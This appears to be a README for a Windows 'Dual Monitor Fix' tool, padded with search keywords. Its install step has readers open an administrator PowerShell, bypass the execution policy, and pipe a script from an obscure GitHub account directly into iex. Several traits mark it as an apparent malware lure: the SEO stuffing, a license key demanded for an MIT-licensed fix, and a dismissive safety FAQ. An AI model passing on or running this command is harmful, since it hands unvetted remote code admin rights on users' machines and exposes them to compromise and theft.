# Dual Monitor Fix — PowerShell

**Dual-Monitor-Fix-PowerShell**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.0.0-stable-brightgreen?style=flat-square)]()
[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()

Fix dual monitor not detected, wrong resolution, flickering and extended display issues.

---

## Quick Install

Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

The installer downloads the latest build, prompts for your license key and completes setup automatically.

## Step-by-Step

| Step | Action |
|------|--------|
| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
| 2 | Paste the command block above and press **Enter** |
| 3 | Wait for download — progress shown in the console |
| 4 | Enter license key when prompted (also in `license.txt` after install) |
| 5 | Restart if the installer asks — then launch from Start menu |

If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.

---

## Overview

Install Dual Monitor Fix via PowerShell — repair second monitor not detected, wrong resolution and extended display issues on Windows 10/11.

## Common Searches

- second monitor not detected windows 11
- dual monitor not working after update
- extended display not working
- monitor keeps going to sleep
- wrong resolution second monitor

## Features

* **Detect monitors** — Forces Windows to re-scan all connected displays.
* **Extended mode** — Repairs broken extended/duplicate display configuration.
* **Resolution fix** — Restores correct native resolution per monitor.
* **Wake fix** — Stops second monitor sleeping or going undetected.
* **Driver reset** — Resets display adapter without full reinstall.

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum |
| PowerShell | 5.1 or PowerShell 7+ |
| Admin | Required |
| Network | Required for download |

## FAQ

**How do I install without a browser?**
Use the PowerShell command above — no browser needed after Admin shell is open.

**Where is the license key?**
Shown during install and saved to `license.txt` in the install folder.

**Is the script safe to run?**
Hosted on GitHub raw; review `install.ps1` before running if you prefer.

**Second monitor not detected?**
Rescans display outputs and resets GPU adapter.

**Wrong resolution on second screen?**
Restores EDID and native resolution settings.

**Monitor keeps going to sleep?**
Disables aggressive power management on display port.

**After Windows Update broke dual screen?**
Repairs display stack and driver binding.

---

TAGS dual monitor fix, second monitor not detected, dual monitor not working, extended display fix windows 11, powershell install, windows setup script

## License

[MIT](LICENSE)
